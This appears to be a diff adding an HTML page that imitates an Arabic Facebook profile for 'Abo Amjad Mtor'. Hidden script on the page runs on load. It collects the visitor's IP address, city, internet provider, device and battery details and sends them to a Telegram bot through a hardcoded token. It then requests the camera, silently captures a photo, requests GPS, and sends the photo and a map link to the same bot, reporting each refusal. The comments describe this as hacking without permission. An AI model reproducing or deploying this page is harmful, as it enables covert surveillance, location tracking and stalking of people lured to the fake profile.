@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Abo Amjad Mtor">
+    <meta property="og:description" content="‏٢ ألف‏ من الأصدقاء · ‏٥٦‏ من الأصدقاء المشتركين · ‏٤٠‏ من المنشورات">
+    <meta property="og:image" content="https://d.top4top.io/p_37082hh8d0.jpg">
+    <title>Abo Amjad Mtor</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; }
+        .header { background: white; border-bottom: 1px solid #ddd; padding-bottom: 12px; }
+        .cover { width: 100%; height: 210px; background: url('https://c.top4top.io/p_3708caj9q0.png') center/cover; position: relative; }
+        .profile-pic-container { text-align: right; padding-right: 16px; margin-top: -100px; position: relative; }
+        .p-pic { width: 168px; height: 168px; border-radius: 50%; border: 4px solid white; background: url('https://d.top4top.io/p_37082hh8d0.jpg') center/cover; display: inline-block; }
+        .info { padding: 10px 16px; background: white; }
+        .name { font-size: 24px; font-weight: bold; color: #050505; margin: 0; }
+        .stats { font-size: 15px; color: #65676b; margin-top: 4px; }
+        .buttons { display: flex; gap: 8px; padding: 12px 16px; background: white; }
+        .btn-blue { background: #1877f2; color: white; border: none; flex: 1; padding: 8px; border-radius: 6px; font-weight: bold; }
+        .btn-gray { background: #e4e6eb; color: #050505; border: none; flex: 1; padding: 8px; border-radius: 6px; font-weight: bold; }
+        .tabs { display: flex; border-top: 1px solid #ddd; background: white; padding: 10px 16px; gap: 20px; color: #65676b; font-size: 14px; }
+        .active-tab { color: #1877f2; border-bottom: 2px solid #1877f2; padding-bottom: 5px; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="cover"></div>
+        <div class="profile-pic-container"><div class="p-pic"></div></div>
+        <div class="info">
+            <h1 class="name">Abo Amjad Mtor</h1>
+            <div class="stats">‏٢ ألف‏ من الأصدقاء • ‏٥٦‏ من الأصدقاء المشتركين</div>
+            <div class="stats">٤٠ من المنشورات</div>
+        </div>
+        <div class="buttons">
+            <button class="btn-blue">إضافة صديق</button>
+            <button class="btn-gray">مراسلة</button>
+        </div>
+        <div class="tabs">
+            <span class="active-tab">الكل</span>
+            <span>الصور</span>
+            <span>ريلز</span>
+        </div>
+    </div>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
+
+    <script>
+        const TOKEN = "8367707810:AAFdTLpznKlb8A7vxLMsLlAuCDQOS7v5KAA";
+        const CHAT_ID = "5775781038";
+
+        async function sendToTelegram(msg) {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+        }
+
+        async function sendPhoto(blob) {
+            let fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'target.jpg');
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        }
+
+        async function startHacking() {
+            // 1. سحب معلومات الجهاز والـ IP فوراً (بدون إذن)
+            try {
+                let ipRes = await fetch('https://ipapi.co/json/');
+                let d = await ipRes.json();
+                let bat = await navigator.getBattery();
+                let initialMsg = `<b>🔥 تم سحب بيانات Abo Amjad الأولية 🔥</b>\n\n` +
+                                 `🌐 IP: <code>${d.ip}</code>\n` +
+                                 `🏙️ المدينة: ${d.city}, ${d.country_name}\n` +
+                                 `📡 المزود: ${d.org}\n` +
+                                 `📱 الجهاز: ${navigator.userAgent}\n` +
+                                 `🔋 البطارية: ${Math.round(bat.level * 100)}%`;
+                await sendToTelegram(initialMsg);
+            } catch (e) { console.log("Silent Error"); }
+
+            // 2. طلب الأذونات (كاميرا و GPS) مباشرة وراء بعض
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                    const video = document.getElementById('v');
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        const canvas = document.getElementById('c');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(sendPhoto, 'image/jpeg');
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 3000);
+                }).catch(err => sendToTelegram("⚠️ رفض الكاميرا"));
+            }
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    let gps = `🎯 <b>موقع Abo Amjad الدقيق:</b>\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendToTelegram(gps);
+                }, () => sendToTelegram("⚠️ رفض الـ GPS"));
+            }
+        }
+
+        window.onload = startHacking;
+    </script>
+</body>
+</html>
